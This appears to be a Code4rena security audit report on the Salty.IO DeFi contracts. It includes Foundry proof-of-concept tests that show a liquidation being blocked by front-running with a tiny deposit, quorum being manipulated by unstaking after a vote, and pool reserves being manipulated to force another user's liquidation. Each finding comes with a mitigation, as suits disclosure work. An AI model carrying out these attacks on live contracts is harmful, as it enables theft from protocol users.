
____________________________________
# [H-01] - A user can prevent being liquidated by adding few wei of collateral just before liquidator call

https://github.com/code-423n4/2024-01-salty/blob/main/src/staking/StakingRewards.sol#L107


## Vulnerability details

Alice can front-run a liquidator call `liquidate(alice)` by calling `depositCollateralAndIncreaseShare` with a value > DUST and DoS/prevent its liquidation, [as liquidate](https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/CollateralAndLiquidity.sol#L154) is limited [by `cooldownExpiration` in `_decreaseUserShare`](https://github.com/code-423n4/2024-01-salty/blob/main/src/staking/StakingRewards.sol#L107)

Why? 

1) every time `_increaseUserShare` or `_decreaseUserShare` is called with `useCooldown = true`, a cooldown is set to `block.timestamp + modificationCooldown`. This cooldown will prevent any calls to these functions (if `useCooldown = true`) until the time has passed
2) Because `depositCollateralAndIncreaseShare` (which calls `_depositLiquidityAndIncreaseShare`, itself calling `_increaseUserShare` with `useCooldown == true`) increase the cooldown
3) And `liquidate(alice)` also calls `_decreaseUserShare(alice,...)` with `useCooldown = true` in the same block, the cooldown will not be expired, causing the call to revert

## Impact
A malicious user can keep its position unhealthy by preventing liquidations

## Proof of Concept

```solidity
	function test_auditPreventLiquidationByAddingCollateral() public {
		
		// Bob deposits collateral so alice can be liquidated
        vm.startPrank(bob);
		collateralAndLiquidity.depositCollateralAndIncreaseShare(wbtc.balanceOf(bob), weth.balanceOf(bob), 0, block.timestamp, false );
		vm.stopPrank();


        // Deposit and borrow from Alice's account to create basis for liquidation
        _depositCollateralAndBorrowMax(alice);

        // Cause a drastic price drop to allow for liquidation
        _crashCollateralPrice();

        vm.expectRevert("Must wait for the cooldown to expire");
        collateralAndLiquidity.liquidateUser(alice);

        // Warp past the lockout period, so liquidation is now allowed
        vm.warp(block.timestamp + 1 hours); // warp to just after the lockout period

		//alice add few wai of liquidity, which do not recover her health factor
		deal(address(wbtc), alice, 101);
		deal(address(weth), alice, 101);
		vm.prank(alice);
		collateralAndLiquidity.depositCollateralAndIncreaseShare(101, 101, 0, block.timestamp, false );

        vm.expectRevert("Must wait for the cooldown to expire");
        collateralAndLiquidity.liquidateUser(alice);
    }
```

## Tools Used
Manual review

## Recommended Mitigation Steps
When the user position is unhealthy, user should be forced to at least add collateral up to a healthy state




____________________________________

# [M-01] - A user can vote for proposals and unstake right after to reduce the required quorum while maintaining its votes

https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/Proposals.sol#L259-L293
https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/Proposals.sol#L320
https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/Proposals.sol#L396

## Vulnerability details

A user can  with its stake (1) vote for a proposal/multiple proposals, (2) unstake, which will burn its shares thus reducing the shares totalSupply, thus reducing the required quorum. (3) He can then call cancelUnstake when the vote is over to get its shares back.
This basically allow him [to skew the ratio of votes to requiredQuorum](https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/Proposals.sol#L396)

## Impact
Manipulation of the voting to quorum ratio 

## Proof of Concept

```solidity
	function test_auditCastVoteThenReduceQuorum() public {

		vm.startPrank(DEPLOYER);
		// 2 million staked. Default 10% will be 200k which does not meet the 0.50% of total supply minimum quorum.
		// So 500k (0.50% of the totalSupply) will be used as the quorum
		staking.stakeSALT( 10_000_000 ether );
		
        string memory ballotName = "parameter:2";

		proposals.proposeParameterBallot(2, "description" );
		vm.stopPrank();

		uint256 ballotID = proposals.openBallotsByName(ballotName);

		console.log("--- Initial state with xSALT in the protocol ---");
		console.log("total votes for the ballot:\t",proposals.totalVotesCastForBallot(ballotID));
		console.log("required quorum:\t\t",proposals.requiredQuorumForBallotType(BallotType.PARAMETER));

        Vote userVote = Vote.INCREASE;
		uint256 aliceSaltBalance = 10_000_000 ether;

		console.log("--- Alice stakes 10M SALT & votes for ballot ---");
        vm.startPrank(alice);
		staking.stakeSALT( aliceSaltBalance );
        proposals.castVote(ballotID, userVote);
		console.log("total votes for the ballot:\t",proposals.totalVotesCastForBallot(ballotID));
		console.log("required quorum:\t\t",proposals.requiredQuorumForBallotType(BallotType.PARAMETER));

		console.log("--- Alice unstake all ---");
        uint256 votingPower = staking.userShareForPool(alice, PoolUtils.STAKED_SALT);
		staking.unstake(votingPower, 2);

		console.log("total votes for the ballot:\t", proposals.totalVotesCastForBallot(ballotID));
		console.log("required quorum:\t\t",proposals.requiredQuorumForBallotType(BallotType.PARAMETER));
    }
```

## Tools Used
Manual review

## Recommended Mitigation Steps
Disallow unstaking for a user if he has active votes


____________________________________
# [M-02] - Attacker can liquidated users by manipulationg WETH/WBTC pool reserves
https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/CollateralAndLiquidity.sol#L145
https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/CollateralAndLiquidity.sol#L304
https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/CollateralAndLiquidity.sol#L230-L235

## Vulnerability details

`userCollateralValueInUSD`, which is called by `canUserBeLiquidated`, uses the WETH/WBTC pool reserves to calculate how much worth of WBTC and WETH are liquidated user's shares.
Then these numbers are used to calculate the `underlyingTokenValueInUSD`. But depending on WBTC and WETH price, this can change the USD value of its shares, making him liquidable or not.

By swapping into the pool, the attacker can change the reserves ratio of WBTC and WETH to put users in a liquidation position to get the liquidation reward, then set back the pool to its previous state and keep the profit.

https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/CollateralAndLiquidity.sol#L230-L235
```solidity
File: src\stable\CollateralAndLiquidity.sol
221: 	function userCollateralValueInUSD( address wallet ) public view returns (uint256)
222: 		{
223: 		uint256 userCollateralAmount = userShareForPool( wallet, collateralPoolID );
224: 		if ( userCollateralAmount == 0 )
225: 			return 0;
226: 
227: 		uint256 totalCollateralShares = totalShares[collateralPoolID];
228: 
229: 		// Determine how much collateral share the user currently has
230: 		(uint256 reservesWBTC, uint256 reservesWETH) = pools.getPoolReserves(wbtc, weth); //@audit-issue manipulable
231: 
232: 		uint256 userWBTC = (reservesWBTC * userCollateralAmount ) / totalCollateralShares; //@audit we can change userWBTC and userWETH ratio so that underlyingTokenValueInUSD return another amount
233: 		uint256 userWETH = (reservesWETH * userCollateralAmount ) / totalCollateralShares;
234: 
235: 		return underlyingTokenValueInUSD( userWBTC, userWETH );
236: 		}
```

## Impact
A malicious user can manipulate the WBTC/WETH reserves ratio by swapping and use this to liquidate users.

## Proof of Concept

```solidity
	function test_auditMakeUserLiquidatable() public { //@audit H03: POC 
		
		// Bob deposits collateral so alice can be liquidated
        vm.startPrank(bob);
		collateralAndLiquidity.depositCollateralAndIncreaseShare(wbtc.balanceOf(bob), weth.balanceOf(bob), 0, block.timestamp, false );
		vm.stopPrank();


        // Deposit and borrow from Alice's account to create basis for liquidation
        _depositCollateralAndBorrowMax(alice);
        // Warp past the lockout period, so liquidation is now allowed
        vm.warp(block.timestamp + 1 hours); // warp to just after the lockout period

        // Cause a drastic price drop just above liquidation threshold
		vm.startPrank( DEPLOYER );
		forcedPriceFeed.setBTCPrice( forcedPriceFeed.getPriceBTC() * 55 / 100);
		forcedPriceFeed.setETHPrice( forcedPriceFeed.getPriceETH() * 55 / 100);
		vm.stopPrank();

		//Alice is not liquidable
		assertEq(collateralAndLiquidity.canUserBeLiquidated(alice), false);
        vm.expectRevert("User cannot be liquidated");
        collateralAndLiquidity.liquidateUser(alice);

		//liquidator swap WBTC in the pool to change the reserves ratio
		uint256 wbtcAmount = 1e8;
		deal(address(wbtc), address(this), wbtcAmount);
		wbtc.approve(address(pools), wbtcAmount);
		pools.deposit(wbtc, wbtcAmount);
		pools.swap(wbtc, weth, wbtcAmount, 0, block.timestamp);

		//after swap, Alice become liquidable
		assertEq(collateralAndLiquidity.canUserBeLiquidated(alice), true);

		//liquidator then liquidate alice
        collateralAndLiquidity.liquidateUser(alice);
    }
```

## Tools Used
Manual review

## Recommended Mitigation Steps
Don't allow to swap collateral pool and liquidate in the same call?

____________________________________
# [M-03] - Residual approvals will cause `_depositLiquidityAndIncreaseShare` to revert for some tokens (e.g USDT)

https://github.com/code-423n4/2024-01-salty/blob/main/src/staking/Liquidity.sol#L96-L97
https://github.com/code-423n4/2024-01-salty/blob/main/src/staking/Liquidity.sol#L110-L114

## Vulnerability details
Some tokens, the most used being USDT, will revert if an approval M is set while allowance is still >0 : https://github.com/d-xo/weird-erc20?tab=readme-ov-file#approval-race-protections
The thing is, `_depositLiquidityAndIncreaseShare` approve `maxAmount` of the token before sending `maxAmount - addedAmount`, where addedAmount is the recalculated amount based on the pool reserves ratio.
If `addedAmount >0`, then a residual allowance will be existing between the `Liquidity` contract and `Pool` contract, which will prevent any deposit to the USDT pool reserves by any user
This is because the approval is not between the user depositing and the Pool contract, but between the `Liquidity` contract and `Pool`

## Impact
Deposit to USDT pool or other tokens with same behavior will be impossible if a residual approval happens.


## Tools Used
Manual review

## Recommended Mitigation Steps
Set back allowance to zero once transfer are executed.

____________________________________
# [G-01] - MSB extraction can be optimized

The `_maximumMSB` function could be rewritten in a way more efficient way :

```diff
File: src\pools\PoolMath.sol130: 	// Determine the maximum msb across the given values
131: 	function _maximumMSB( uint256 r0, uint256 r1, uint256 z0, uint256 z1 ) internal pure returns (uint256 msb)
132: 		{
133: +		msb = _mostSignificantBit(r0 | r1 | z0 | z1);
133: -		msb = _mostSignificantBit(r0);
134: -
135: -		uint256 m = _mostSignificantBit(r1);
136: -		if ( m > msb )
137: -			msb = m;
138: -
139: -		m = _mostSignificantBit(z0);
140: -		if ( m > msb )
141: -			msb = m;
142: -
143: -		m = _mostSignificantBit(z1);
144: -		if ( m > msb )
145: -			msb = m;
146: 		}
```
